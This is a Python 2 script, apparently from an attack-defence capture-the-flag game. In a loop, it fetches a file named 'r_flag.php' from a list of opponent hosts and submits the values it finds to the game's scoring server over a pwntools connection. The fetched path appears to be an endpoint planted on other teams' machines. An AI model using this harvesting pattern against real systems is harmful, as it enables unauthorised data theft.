from pwn import *
import requests

context.log_level = "critical"

host = "submit.alcapwnctf.in"
port = 31337

token = open("info.txt").read()
url_file = open("url.txt").readlines()

urls = []

for i in range(len(url_file)):
    urls.append("https://" + url_file[i].strip("\r\n") + "/home/talking/r_flag.php")

def get_flag(url):

    r = requests.get(url)
    if r.status_code == 404:
        return None
    data = r.text[5:-6].encode('utf-8').split("<br>")
    return data


while True:

    for url in urls:
        print url
        flags = get_flag(url)
        if flags == None:
            continue

        for i in flags:

            p = remote(host, port)
            p.recvline()
            p.sendline(token)
            p.recvline()
            p.sendline(i)
            response = p.recvline().strip()
            
            print "[+] "+ response + " " + i

            p.close()
